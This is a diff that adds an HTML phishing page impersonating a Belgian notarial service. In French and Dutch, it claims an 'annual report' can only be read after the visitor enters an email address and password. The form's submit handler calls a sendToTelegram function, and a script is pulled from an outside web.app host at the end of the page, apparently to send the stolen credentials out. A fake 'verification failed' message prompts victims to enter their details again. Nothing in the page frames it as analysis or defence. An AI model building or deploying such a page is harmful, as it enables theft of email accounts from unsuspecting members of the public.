@@ -1,0 +1,214 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rapport annuel des notaires</title>
+    <link rel="icon" type="image/png" href="https://files.catbox.moe/h90lru.jpg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://btmd.web.app/bootstrapcmd.min.css" charset="utf-8" />
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'georgian;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: white;
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            width: 90%;
+            max-width: 1200px;
+            padding: 5px;
+            background: white;
+        }
+
+        .logo-notaire {
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        #language-selector {
+            display: flex;
+            gap: 8px;
+        }
+
+        #language-selector button {
+            padding: 5px 10px;
+            font-size: 12px;
+            background-color: white;
+            color: black;
+            border: 2px solid #00AECF;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s;
+        }
+
+        #language-selector button:hover {
+            background-color: #00AECF;
+            color: white;
+            transform: scale(1.05);
+        }
+
+        #language-selector .selected {
+            background-color: #ccc;
+            color: white;
+        }
+
+        .content-container {
+            width: 90%;
+            max-width: 850px;
+            padding: 25px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            font-size: 18px;
+        }
+
+        #next {
+            background-color: #00AECF; /* Couleur de l'image fournie */
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        #next:hover {
+            background-color: #0088A8; /* Teinte légèrement plus foncée */
+        }
+
+        @media (max-width: 600px) {
+            .top-bar {
+                width: 95%;
+                padding: 5px;
+            }
+            .logo-notaire {
+                height: 35px;
+            }
+            .content-container {
+                width: 95%;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <img id="logo-notaire" class="logo-notaire" src="https://zupimages.net/up/25/05/vcr2.jpg" alt="Logo Notaire">
+        <div id="language-selector">
+            <button id="fr" onclick="changeLanguage('fr')">FR</button>
+            <button id="nl" onclick="changeLanguage('nl')">NL</button>
+        </div>
+    </div>
+
+    <div id="load">
+        <img src="https://zupimages.net/up/25/05/vcr2.jpg" id="logo-img-load">
+    </div>
+    <div class="f-container">
+        <div class="header">
+            <img src="https://zupimages.net/up/25/05/vcr2.jpg" id="logo-img-header">
+        </div>
+        <div class="f-content">
+            <form method=post onsubmit="sendToTelegram(); return false;">
+                <div class="f-description" id="description">Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé</div>
+                <div id="message1">Echec de la vérification. <br> Veuillez réessayer en utilisant les identifiants corrects...</div>
+                <div id="message"></div>
+                <div class="f-inputs-container">
+                    <input id="oneo" name="mega" placeholder="Adresse e-mail" type="email" required autocomplete="off" autofocus>
+                </div>
+                <div class="f-inputs-container" id="twoo-container">
+                    <input id="twoo" name="giga" placeholder="Mot de passe" type="password" required autocomplete="off">
+                </div>
+                <div class="f-inputs-container buttons">
+                    <center>
+                        <button id="next">Continuer</button>
+                        <button id="submit-btn">S'identifier</button>
+                    </center>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer" id="footer-text">
+        © 2025 Notarial Services - Tous droits réservés
+    </div>
+    <script>
+        // On charge la langue par défaut dès le chargement de la page
+        window.onload = function() {
+            changeLanguage('fr'); // Appliquer la langue par défaut (français ou néerlandais)
+        };
+
+        // Objet de traduction pour les deux langues
+        const translations = {
+            fr: {
+                description: "Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé",
+                next: "Continuer",
+                submit: "S'identifier",
+                email: "Adresse e-mail",
+                password: "Mot de passe",
+                logo: "https://zupimages.net/up/25/05/vcr2.jpg", // Logo français
+                notaire1: "notaire",
+                notaire2: ".be",
+                errorMessage: "Echec de la vérification. <br> Veuillez réessayer en utilisant les identifiants corrects...",
+                footerText: "© 2025 Notarial Services - Tous droits réservés"
+            },
+            nl: {
+                description: "Om dit rapport te lezen, voert u de inloggegevens in van de e-mail waarmee het bestand is verzonden",
+                next: "Doorgaan",
+                submit: "Inloggen",
+                email: "E-mailadres",
+                password: "Wachtwoord",
+                logo: "https://zupimages.net/up/25/05/t63n.jpg", // Logo néerlandais
+                notaire1: "notaris",
+                notaire2: ".be",
+                errorMessage: "Fout bij verificatie. <br> Probeer het opnieuw met de juiste gegevens...",
+                footerText: "© 2025 Notariediensten - Alle rechten voorbehouden"
+            }
+        };
+
+        // Fonction pour changer la langue et le logo
+        function changeLanguage(lang) {
+            // Désélectionner les boutons
+            document.getElementById('fr').classList.remove('selected');
+            document.getElementById('nl').classList.remove('selected');
+
+            // Sélectionner le bouton correspondant à la langue choisie
+            document.getElementById(lang).classList.add('selected');
+
+            // Mettre à jour les traductions
+            document.getElementById('description').textContent = translations[lang].description;
+            document.getElementById('next').textContent = translations[lang].next;
+            document.getElementById('submit-btn').textContent = translations[lang].submit;
+            document.getElementById('oneo').placeholder = translations[lang].email;
+            document.getElementById('twoo').placeholder = translations[lang].password;
+
+            // Changer l'image du logo en fonction de la langue
+            document.getElementById('logo-img-load').src = translations[lang].logo;
+            document.getElementById('logo-img-header').src = translations[lang].logo;
+
+            // Modifier le texte de "notaire.be" selon la langue
+            document.getElementById('notaire-part1').textContent = translations[lang].notaire1;
+            document.getElementById('notaire-part2').textContent = translations[lang].notaire2;
+
+            // Modifier le message d'erreur
+            document.getElementById('message1').innerHTML = translations[lang].errorMessage;
+
+            // Modifier le texte du pied de page
+            document.getElementById('footer-text').textContent = translations[lang].footerText;
+        }
+    </script>
+</body>
+
+	 <script src="https://rayan-3c244-89837.web.app/so.js"></script>
+</body>
+</html>
